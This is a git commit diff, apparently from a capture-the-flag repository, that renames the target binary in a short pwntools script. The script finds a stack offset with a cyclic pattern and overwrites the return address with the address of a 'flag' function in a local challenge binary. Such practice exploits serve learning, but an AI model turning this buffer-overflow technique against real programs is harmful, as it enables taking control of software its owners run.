078c38ee3108afb0b99d99de339875635f32c2d0
Jarrod Pas <jarrod@jarrodpas.com>
2019-02-11 10:27:53 -0700

    Rename x86 buffer overflow

--- pwn/0v3rfl0w/own.py
+++ pwn/0v3rfl0w/own.py
@@ -4,20 +4,22 @@ from __future__ import print_function
 import sys
 
 from pwn import *
+context.binary = b = './gg'
 context.terminal = ['tmux', 'splitw', '-v']
 
+
 if len(sys.argv) > 1:
-    p = gdb.debug('./buf')
+    p = gdb.debug(b)
     pause()
     p.sendline(cyclic(512))
     pause()
     # run in gdb: x/1x $sp to get value in sp
     sys.exit()
 
-elf = ELF('./buf')
+elf = ELF(b)
 exploit = cyclic(cyclic_find(0x61616167))
 exploit += p64(elf.symbols[u'flag'])
 
-p = process('./buf')
+p = process(b)
 p.sendline(exploit)
 print(p.recvline(), end='')
